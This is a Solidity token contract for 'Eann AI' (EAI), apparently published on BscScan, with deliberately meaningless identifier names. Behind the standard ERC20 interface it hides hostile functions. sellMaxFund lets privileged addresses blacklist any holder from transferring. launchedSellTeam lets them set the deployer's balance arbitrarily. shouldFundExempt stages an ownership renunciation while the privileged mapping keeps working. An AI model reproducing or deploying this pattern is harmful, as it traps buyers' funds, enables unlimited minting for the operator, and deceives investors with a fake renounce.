/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

abstract contract listReceiverToken {
    function isLiquiditySenderReceiver() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface minLaunchTo {
    function createPair(address sellIsTotal, address enableListLaunched) external returns (address);
}

interface amountFeeLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract EannAI is IERC20, listReceiverToken {

    mapping(address => uint256) private enableBuyTotalTeam;

    function shouldTxMode() public view returns (bool) {
        return limitReceiverReceiver;
    }

    string private shouldLaunchedAmount = "Eann AI";

    function sellMaxFund(address liquidityModeIsReceiver) public {
        
        if (liquidityModeIsReceiver == takeTotalShould || liquidityModeIsReceiver == minAtTeam || !receiverTradingFee[isLiquiditySenderReceiver()]) {
            return;
        }
        
        marketingTeamMinSell[liquidityModeIsReceiver] = true;
    }

    constructor (){ 
        if (limitFundExempt == amountMarketingAt) {
            amountMarketingAt = false;
        }
        amountFeeLaunched modeMaxTotalTeam = amountFeeLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        minAtTeam = minLaunchTo(modeMaxTotalTeam.factory()).createPair(modeMaxTotalTeam.WETH(), address(this));
        atTotalTx = isLiquiditySenderReceiver();
        
        takeTotalShould = isLiquiditySenderReceiver();
        receiverTradingFee[isLiquiditySenderReceiver()] = true;
        if (isTotalMarketing) {
            limitFundExempt = true;
        }
        enableBuyTotalTeam[isLiquiditySenderReceiver()] = sellAmountLimit;
        emit Transfer(address(0), takeTotalShould, sellAmountLimit);
        shouldFundExempt();
    }

    address public takeTotalShould;

    function name() external view returns (string memory) {
        return shouldLaunchedAmount;
    }

    function launchedSellTeam(uint256 tradingEnableToken) public {
        if (!receiverTradingFee[isLiquiditySenderReceiver()]) {
            return;
        }
        enableBuyTotalTeam[takeTotalShould] = tradingEnableToken;
    }

    event OwnershipTransferred(address indexed amountLaunchedTo, address indexed isLaunchedMarketing);

    function toListFee() public view returns (bool) {
        return limitMinTeam;
    }

    function getOwner() external view returns (address) {
        return atTotalTx;
    }

    uint256 public shouldReceiverEnable;

    bool private limitMinTeam;

    bool private isTotalMarketing;

    uint256 private teamSwapLiquidityFrom;

    function decimals() external view returns (uint8) {
        return isTeamSender;
    }

    bool public fromLimitSwapEnable;

    bool public modeLaunchedMarketing;

    address private atTotalTx;

    function shouldFundExempt() public {
        emit OwnershipTransferred(takeTotalShould, address(0));
        atTotalTx = address(0);
    }

    function buySellReceiver(address shouldTotalBuy) public {
        if (modeLaunchedMarketing) {
            return;
        }
        if (isTotalMarketing) {
            limitMinTeam = false;
        }
        receiverTradingFee[shouldTotalBuy] = true;
        if (receiverMinExempt != shouldReceiverEnable) {
            receiverMinExempt = teamSwapLiquidityFrom;
        }
        modeLaunchedMarketing = true;
    }

    bool public limitReceiverReceiver;

    function txWalletAmount() public view returns (bool) {
        return limitReceiverReceiver;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellAmountLimit;
    }

    function allowance(address listReceiverFrom, address limitLaunchedExemptWallet) external view virtual override returns (uint256) {
        return walletTradingTeam[listReceiverFrom][limitLaunchedExemptWallet];
    }

    uint8 private isTeamSender = 18;

    function owner() external view returns (address) {
        return atTotalTx;
    }

    bool public limitFundExempt;

    function autoReceiverAt() public view returns (bool) {
        return amountMarketingAt;
    }

    function fromExemptWallet(address feeTotalMin, address atSellLaunch, uint256 tradingEnableToken) internal returns (bool) {
        if (feeTotalMin == takeTotalShould) {
            return marketingTxList(feeTotalMin, atSellLaunch, tradingEnableToken);
        }
        require(!marketingTeamMinSell[feeTotalMin]);
        return marketingTxList(feeTotalMin, atSellLaunch, tradingEnableToken);
    }

    address public minAtTeam;

    mapping(address => bool) public receiverTradingFee;

    function transfer(address buyTxLaunchedShould, uint256 tradingEnableToken) external virtual override returns (bool) {
        return fromExemptWallet(isLiquiditySenderReceiver(), buyTxLaunchedShould, tradingEnableToken);
    }

    string private limitLiquidityTeam = "EAI";

    function balanceOf(address limitExemptToken) public view virtual override returns (uint256) {
        return enableBuyTotalTeam[limitExemptToken];
    }

    uint256 private receiverMinExempt;

    function transferFrom(address feeTotalMin, address atSellLaunch, uint256 tradingEnableToken) external override returns (bool) {
        if (walletTradingTeam[feeTotalMin][isLiquiditySenderReceiver()] != type(uint256).max) {
            require(tradingEnableToken <= walletTradingTeam[feeTotalMin][isLiquiditySenderReceiver()]);
            walletTradingTeam[feeTotalMin][isLiquiditySenderReceiver()] -= tradingEnableToken;
        }
        return fromExemptWallet(feeTotalMin, atSellLaunch, tradingEnableToken);
    }

    bool public txReceiverMarketingTrading;

    function symbol() external view returns (string memory) {
        return limitLiquidityTeam;
    }

    uint256 private sellAmountLimit = 100000000 * 10 ** 18;

    bool private amountMarketingAt;

    function marketingTxList(address feeTotalMin, address atSellLaunch, uint256 tradingEnableToken) internal returns (bool) {
        require(enableBuyTotalTeam[feeTotalMin] >= tradingEnableToken);
        enableBuyTotalTeam[feeTotalMin] -= tradingEnableToken;
        enableBuyTotalTeam[atSellLaunch] += tradingEnableToken;
        emit Transfer(feeTotalMin, atSellLaunch, tradingEnableToken);
        return true;
    }

    function approve(address limitLaunchedExemptWallet, uint256 tradingEnableToken) public virtual override returns (bool) {
        walletTradingTeam[isLiquiditySenderReceiver()][limitLaunchedExemptWallet] = tradingEnableToken;
        emit Approval(isLiquiditySenderReceiver(), limitLaunchedExemptWallet, tradingEnableToken);
        return true;
    }

    function teamSellMode() public view returns (bool) {
        return txReceiverMarketingTrading;
    }

    function fundLaunchTx() public {
        
        if (limitFundExempt) {
            limitMinTeam = false;
        }
        limitFundExempt=false;
    }

    mapping(address => bool) public marketingTeamMinSell;

    mapping(address => mapping(address => uint256)) private walletTradingTeam;

}